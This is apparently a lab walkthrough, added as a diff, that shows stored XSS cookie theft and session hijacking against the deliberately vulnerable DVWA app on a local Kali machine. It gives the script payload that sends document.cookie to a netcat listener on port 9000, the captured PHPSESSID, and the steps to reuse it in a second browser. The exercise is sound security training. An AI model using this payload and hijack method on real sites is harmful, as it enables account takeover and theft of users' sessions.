@@ -1,0 +1,32 @@
+Kali – Run a vulnerable app
+sudo docker run --rm -it -p 80:80 vulnerables/web-dvwa
+Browser A on the same machine
+http://127.0.0.1
+User name: admin
+Password: password
+Create/Reset database
+Left side bar: click on DVWA Security -> Low -> submit
+XSS (Stored) -> Name: test -> Message: <script>new Image().src="http://127.0.0.1:9000/?cookie="+document.cookie;</script>
+When a victim loads this guestbook page, their browser reads this hidden script, looks up their active authentication cookies via document.cookie, and attempts to load an invisible image from an IP address controlled by the attacker (Port 9000), passing the cookie right in the URL parameter
+
+Open a new terminal: nc -lvnp 9000
+We need to set up a quick listener on Port 9000 to catch that incoming cookie using netcat
+Back to browser A: Refresh the XSS (Stored) page (simulating a victim visiting the guestbook)
+Look at your netcat terminal tab. You will see an incoming HTTP request containing the victim's raw session ID
+CONNECT received from 127.0.0.1
+GET /?cookie=PHPSESSID=b3df762e1a329fa87b32c638f801bc7d;%20security=low HTTP/1.1
+Copy the string value b3…7d   -> This is the master key
+
+
+
+Hijack the session (Browser B)
+Open a completely separate browser application (like Chromium) or an Incognito Window in Firefox
+Navigate to http://127.0.0.1/vulnerabilities/xss_s/
+Notice that it boots you out and forces you to the login screen because you aren't authenticated
+Open your browser's Developer Tools (F12), head over to the Storage or Application tab, and locate Cookies
+Find the PHPSESSID cookie, paste your stolen hash value directly into it, and hit enter
+Refresh the page.  Result: The login page completely vanishes, and you are dropped directly into the authenticated session as the admin without ever entering a username or password
+
+
+
+
